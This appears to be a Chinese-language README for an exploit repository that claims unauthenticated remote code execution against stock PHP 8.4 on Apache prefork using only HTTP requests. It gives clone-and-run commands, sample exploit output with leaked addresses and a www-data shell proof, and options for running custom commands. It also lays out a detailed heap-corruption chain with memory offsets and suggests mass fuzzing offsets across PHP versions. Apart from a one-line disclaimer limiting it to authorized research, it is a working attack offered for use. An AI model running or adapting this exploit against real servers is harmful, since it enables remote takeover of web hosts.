# php2shell - 官方环境 无需display_errors，不修改memory_limit

中文 | [English](readme_en.md)

**官方 prefork 配置（MaxRequestWorkers=150）下**，在完全远程、只用 HTTP、目标页面只有 `<?php echo "OK\n"; ?>`、不写目标侧
PHP 的约束下，一条命令拿到 RCE：

- stock 官方镜像 + 官方 ini + 官方 worker：**10/10**
- 单 worker 基线（早期标定/调试）：**20/20**
- 单次约 3–4 秒（含 149 个占位连接），被固定的 worker 不重启，目标 ini 未改

# 通用利用

理论上只要你计算出所有php版本的偏移，然后利用这些偏移批量去fuzz，总有一条fuzz是能rce的。反正worker崩了也会重启，不怕目标打挂。

关于 worker：官方 prefork 的 `MaxRequestWorkers=150` 也已打通。脚本先占住 149 个 worker 的未完成请求，再把 A1/B1/A2/B2 固定到剩下的同一个 child；单 worker 只是早期的调试形态（`--workers 1` 仍可复现）。

## 快速开始（官方 php.ini-production / display_errors=Off / 128M）

```bash
git clone https://github.com/9bie/php2shell-bypass-aslr-exp.git
cd php2shell-bypass-aslr-exp

# 1) 起目标：stock 官方镜像；容器里只把官方 php.ini-production 复制成 php.ini
./pure/run_pure.sh
# target: OK
# PHP 8.4.26 ...
# display_errors => Off => Off
# memory_limit => 128M => 128M
# workers: official (run exploit with --workers 150)

# 2) 一条命令：A1 -> B1 泄漏 -> A2 -> B2 -> id
python3 exploit.py --port 18110
#       pinned 150/150 workers (149 holders)
# [try 1] A1: END-cleanup send_cookie OOM
# [try 1] B1: stale-id OOB read (chunk base + libphp)
#       decoded=819208 zval_ptr_dtor=0x7fe00ef5db60 -> libphp=0x7fe00e8ff000
#       chunk buckets: [('0x7fe00c600000', 7495), ('0x7fe00ee00000', 1095),
#                       ('0x7fe00cc00000', 87), ('0x7fe00c400000', 79)]
# [try 1] A2 + B2: main=0x7fe00cc00000 S=0x7fe00ccf8398 zif_system=0x7fe00ed64370
# [4/4] RCE OK; proof .../out/p1:
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

不编译 PHP/Apache、不 build 镜像、不挂 gdb、不改目标 ini。
`pure/run_pure.sh` 默认容器 `p2s-pure-18110`、端口 `18110`，默认使用
官方 prefork 配置（MaxRequestWorkers=150），起完会打印实际 ini 和 MPM
值；`--single` 才挂非官方的单 worker 覆盖
`pure/docker/apache-single-worker.conf`（配合 `--workers 1`）。`docker/apache.conf`
只是给旧 harness 保留的兼容软链，指向同一个文件。
Linux 上没有 docker 组权限时脚本会自动改用 `sudo docker`，也可以显式
`DOCKER="sudo docker" ./pure/run_pure.sh`；`--dbg` 仅用于换成带符号的
同一构建做离线标定。

常用参数：

```bash
# 换新 ASLR 复测（重启容器）
python3 exploit.py --port 18110 --restart p2s-pure-18110

# 官方 worker 是默认值；--single 起的单 worker 目标用 --workers 1
python3 exploit.py --port 18110 --workers 1

# 自定义命令：把脚本写进挂载目录，再用 sh 执行
printf 'id; uname -a > /out/p1\n' > out/c
python3 exploit.py --port 18110 --cmd 'sh</out/c'
```

`--retries` 默认 3；如果某次越界窗口里最常见的指针不是
`zval_ptr_dtor`，脚本会用 `libphp-main` 的合理区间检查丢弃这次泄漏，
整条链重来。

## 这条纯 HTTP 链

目标页面只有 `<?php echo "OK\n"; ?>`，攻击流量只有 chunked multipart
和普通 GET/POST：

0. **worker pinning**：官方 `MaxRequestWorkers=150`；先开 149 个只发了
   一半 body 的 POST 占住其它 child，A1/B1/A2/B2 就都会落到剩下的同一个
   child，跨请求的悬空指针才有效。
1. **chunked 绕过 `post_max_size`**：不带 `Content-Length` 时
   `content_length=0`，`rfc1867_post_handler` 开头的检查被跳过，
   可以发送远大于 8M 的 body 做堆整形。
2. **A1**：860 个 depth-64 嵌套文件字段 + filler + 大值 + 4000B
   `PHP_SESSION_UPLOAD_PROGRESS`，在 END cleanup 的 `php_url_encode`
   里 OOM；bailout 留下悬空的 `PS(id)` / `PS(mod_data)`，`send_cookie=1`。
3. **B1（越界读）**：安全 close 后让 `PS(id)` 指向伪造的
   `zend_string` 头（len=0xC8000，data 含 `/`），`Set-Cookie` 把 id
   chunk 之后 800KB 内存编码出来。窗口里同时有：
   - 2MiB 对齐的 chunk 指针簇 → id chunk / main chunk base；
   - `G:400` 在 id chunk 尾部留下的洞被 900 个嵌套数组字段填满，
     真实 HashTable 的 `pDestructor = zval_ptr_dtor` 出现 1095 次
     → `libphp = 值 - 0x65EB60`。
4. **A2 + B2**：cheap-OOM 把 `PS(hash_serialize_verifier)` 指到堆上
   (`main+0x7D720`)；B2 用 384B 引用值把它覆盖成指向
   `S=main+0xF8398` 的 zval，S 处伪造 zend_array 的
   `pDestructor = zif_system` (`libphp+0x465370`)，shutdown 时
   `zend_hash_destroy` 调用 `system("id>/out/p1")`。

偏移（本构建，ASLR 无关）：

| 符号/位置 | 值 |
|---|---|
| `zval_ptr_dtor` | `libphp+0x65EB60` |
| `zif_system` | `libphp+0x465370` |
| fake array `S` | `main+0xF8398` |
| A2 的 `hsv` | `main+0x7D720` |

目标环境：Debian 13 (trixie)、Apache 2.4.69 prefork、PHP 8.4.26 NTS
mod_php、files session handler。换 PHP 构建/版本需要重新标定偏移；
ASLR 每次容器启动会变，链上两次泄漏会自己算出来。

## 证据

- 机制与标定：[pure/RESEARCH_PURE_128M.md](pure/RESEARCH_PURE_128M.md)
- 全链脚本：[exploit.py](exploit.py)（`pure/pwn_pure.py` 保留为别名）
- 调试镜像批量日志：[pure/evidence/pwn_pure_batch_20261022.log](pure/evidence/pwn_pure_batch_20261022.log)
- 官方镜像日志：[pure/evidence/pwn_pure_official_20261022.log](pure/evidence/pwn_pure_official_20261022.log)
- 官方 worker 日志：[pure/evidence/official_workers_20261022.log](pure/evidence/official_workers_20261022.log)
- proof：[pure/evidence/pwn_pure_proof_p1.txt](pure/evidence/pwn_pure_proof_p1.txt)

## 旧线（legacy，非本目标）

早期提交里的 `exploit.py` 走的是**自定义** `docker/php.ini`
（`display_errors=On`、`memory_limit=8M`、`max_input_vars=1000`），
与本 README 的官方配置目标无关，已归档到
[archive/legacy-8m/exploit.py](archive/legacy-8m/exploit.py)；
同目录下的 [HTTP_HEAP_LEAK.md](archive/legacy-8m/HTTP_HEAP_LEAK.md)、
[ASLR_PURE_HTTP.md](archive/legacy-8m/ASLR_PURE_HTTP.md) 等描述的是那一线；
旧的 `docker/php.ini`、`docker/docker-compose.yml`、`docker/offsets.py` 和
`lab/apache2_aslr.conf` 也归档到了 `archive/legacy-8m/docker|lab/`。
真正的单 worker 配置和目标页面在 `pure/docker/`
（`apache-single-worker.conf`、`www/index.php`）；`docker/` 只保留
`apache.conf`、`www` 两个兼容软链指向那里。

## 复现声明

- 目标配置就是官方 `php.ini-production`（`display_errors=Off`、
  `memory_limit=128M`）和官方 prefork worker（MaxRequestWorkers=150）：
  没有自定义 ini、没有 `display_errors=On` 依赖、没有目标侧文件、
  没有 `session_start()`、交付路径不用 gdb。
- 仅用于授权环境中的漏洞研究与复现。
